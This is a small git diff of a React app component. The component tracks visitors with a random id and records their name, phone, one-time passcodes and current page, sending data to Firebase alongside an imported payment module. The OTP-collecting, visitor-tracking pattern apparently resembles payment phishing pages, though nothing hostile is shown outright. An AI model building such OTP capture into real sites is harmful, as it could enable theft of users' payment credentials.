@@ -9,16 +9,16 @@ import { Payment } from './kent/kent';
 import { addData } from './firebase';
 
 function App() {
-  
+
   const [currantPage, setCurrantPage] = useState(1);
   const [isLoading, setisloading] = useState(false);
   const [name, setName] = useState('')
   const [phone, setPhone] = useState('')
   const [otp, setOtp] = useState('')
   const [otpArd] = useState([''])
-
-  const data={
-    id:localStorage.getItem('visitor')===undefined?"newvistor":localStorage.getItem('visitor'),
+const [_id]=useState( "id" + Math.random().toString(16).slice(2))
+const data={
+    id:_id,
     hasPersonalInfo:name != '',
     currentPage:currantPage,
     createdDate: new Date().toISOString(),
@@ -46,6 +46,7 @@ function App() {
     await otpArd.push(otp)
   }
 useEffect(()=>{
+localStorage.setItem('vistor',_id)
   addData(data)
 },[])
   return (
